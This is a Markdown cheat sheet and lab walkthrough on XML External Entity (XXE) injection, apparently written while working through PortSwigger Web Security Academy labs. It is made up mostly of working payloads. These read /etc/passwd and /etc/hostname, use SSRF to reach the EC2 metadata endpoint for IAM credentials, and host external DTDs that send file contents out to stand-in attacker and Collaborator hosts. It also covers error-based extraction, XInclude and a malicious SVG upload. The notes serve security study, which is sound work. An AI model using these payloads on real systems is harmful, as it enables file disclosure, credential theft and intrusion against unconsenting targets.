# XML External Entity (XXE) Injection

[Portswigger](https://portswigger.net/web-security/xxe)

## Methodology

### File retrieval testing

Once identified xml usage, try changing the call from somehting like:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

To:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### Blind testing

**initial test** 

Inject a call to your attacker server, collaborator can work here:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

**Using parameter entities:**

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

**Exfiltrate example out of band**

Host file like so:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Then submit request calling this file above:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### Blind xxe to retrieve data via error message

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

If you get an error like so: 
![image](https://github.com/user-attachments/assets/8a7e1335-94fb-4dce-bcff-3b3e38a715c4)

host the above in the exploit server and call it like so

### exploiting blind xxe by repurposing a local DTD

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

### Locating an existing DTD file to repurpose

search for files here:

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

### Xinclude

if you find parameters you can enter in you think might be xml attempt to pull out with xinclude

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### File upload

- when inspecting a file upload attempt to enter SVG filetypes, if accepted enter in xxe payloads to attempt abuse
- sample svg file with xxe injection inside:

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

## Lab Walkthrough

### Exploiting XXE using external entities to retrieve files

- check stock and notice the xml usage in the request
- ![image](https://github.com/user-attachments/assets/11bf7863-ecfa-4902-8381-66e92733c2da)
- Follow first methodology

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

- ![image](https://github.com/user-attachments/assets/12410e56-1725-415d-858c-1351bc421c07)

### Exploiting XXE to perform SSRF attacks

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/.

- check stock and notice the xml usage in the request
- ![image](https://github.com/user-attachments/assets/27034523-346a-4bbe-b002-17b799bed9a4)
- we send our request with the xml calling out to the above internal IP, and see `Invalid product ID: latest`, the latest is the value we got from SSRF so add this to the call to continue

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

- ![image](https://github.com/user-attachments/assets/1f2657d9-d531-4d9c-bda8-f0e87fcb2268)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

- continue until you get the api key you are looking for

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE with out-of-band interaction

- similar to above but without ssrf to an internal we use burp collaborator
- ![image](https://github.com/user-attachments/assets/9bc58dbb-fb34-462b-921e-f7c7f794d44b)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://b7jvjeq1jkow49rtprqealbvwm2dq3es.oastify.com">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE with out-of-band interaction via XML parameter entities

- use the similar out of band but with parameter entities
- ![image](https://github.com/user-attachments/assets/2e97d0c0-44c1-44e9-b901-8426121c2d10)

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

### Exploiting blind XXE to exfiltrate data using a malicious external DTD

- target same stock check issue
- host malicious DTD on the exploit server

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
- then send xxe to call out with the hostname
- ![image](https://github.com/user-attachments/assets/fd84eac7-1e75-48c3-a728-6bfa660aa468)
- check collaborator and you get the hostname

### Exploiting blind XXE to retrieve data via error messages

- when attempting to trigger with regular exploit get an error like this
- ![image](https://github.com/user-attachments/assets/8a7e1335-94fb-4dce-bcff-3b3e38a715c4)
- now host this

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- then call it with this

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac800d20360d877834b956f013c00d9.exploit-server.net/exploit"> %xxe;]>
```

- ![image](https://github.com/user-attachments/assets/9044f10c-1447-4a93-b59c-f11518b4e948)

### Exploiting XInclude to retrieve files

- use check stock and see the values listed
- ![image](https://github.com/user-attachments/assets/ea500b1e-527b-40c0-9564-a8916601ae71)
- place below into the productId value, make sure to url encode it


```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

- ![image](https://github.com/user-attachments/assets/8b5e1732-bef5-4029-8149-b75fe7006963)


### Exploiting XXE via image file upload

- Create a local SVG image with the following content

```
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

- Post a comment on a blog post, and upload this image as an avatar.
- When you view your comment, you should see the contents of the /etc/hostname file in your image. Use the "Submit solution" button to submit the value of the server hostname.






